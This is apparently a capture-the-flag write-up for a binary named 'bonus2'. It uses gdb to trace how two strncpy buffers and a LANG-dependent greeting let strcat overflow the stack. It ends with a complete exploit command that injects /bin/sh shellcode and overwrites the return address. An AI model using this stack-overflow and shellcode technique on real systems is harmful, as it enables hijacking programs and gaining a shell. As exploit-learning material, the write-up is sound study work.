we run the program with gdb and we start analyzing it:
In main we have a cmp in <+15> of argc and 3, that means we should enter 2 arguments or the program will exit, next at line <+78> we have a strncpy(0xbffff650, argv[1], 40) that means it will copy the first 40 characters of argv[1] into that address, and after there is another strncpy(0xbffff678, argv[2], 32) which means it will copy the first 32 characters of argv[2] into 0xbffff678. (NOTE here that the second destination address comes exactly 40 bytes after the first destination address 0xbffff650, that means if we fill all memory addresses in dst1, and since dst2 comes directly after they will be considered as only one string).
after we call getenv("LANG"), and we see the first 2 characters in that env variable, if it's "fi" or "nl" then the language variable will be set to 1 and 2 respectively, then we call greetuser(), in this function we will be setting the greet message depending on the value of language:
if language == 1 then greet = "Hyvää päivää "
if language == 1 then greet = "Goedemiddag! "
else greet = "Hello ";
after that it will concatenate this greet message with dst1 into the address 0xbffff5a0. (as we said earlier if we fill all the 40 characters of dst1, dst2 will be concatenated with it as well since it comes directly after it with no "\0").
We run the program with arg1="A"*40 and arg2="B"*32 and then try inspecting the stack after strcat:
(gdb) x $ebp+4
0xbffff5ec:	0x08004242
(gdb) x/40wx $esp
0xbffff590:	0xbffff590	0xbffff5e0	0x00000001	0x00000000
0xbffff5a0:	0x6c6c6548	0x4141206f	0x41414141	0x41414141
0xbffff5b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff5c0:	0x41414141	0x41414141	0x41414141	0x42424141
0xbffff5d0:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff5e0:	0x42424242	0x42424242	0x42424242	0x08004242
first important information is that the return address ebp+4 comes 76 bytes after our string that starts from 0xbffff590:
["Hello "(6)+"40*A"(40)+"32*B"(32)]=78 and that's why only 2 of our Bs slipped into the return address.hence why it will segfault. it also means we can't overwrite it completely since that's the max our arguments can take. unless we try changing the "LANG" variable, that means our greet message will grow.
let's try changing it to fi (export LANG=nl_US.UTF-8.
["Goedemiddag! "(13)+"40*A"+"27*B"(27)]=80 that means we can can overwrite the ret address now. we will redirect the code to the start of our string + 13 to start reading directly from the shellcode we put in arg1.

cat | ./bonus2 $(python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A"*19') $(python -c 'print "B"*23 + "\xad\xf5\xff\xbf"')

Sometimes addresses of variables in gdb will be different outside gdb this is why we can try adding ‘unset env LINES’ and ‘unset env COLUMNS’ in gdb or offseting the ret address for example "\xbd\xf5\xff\xbf"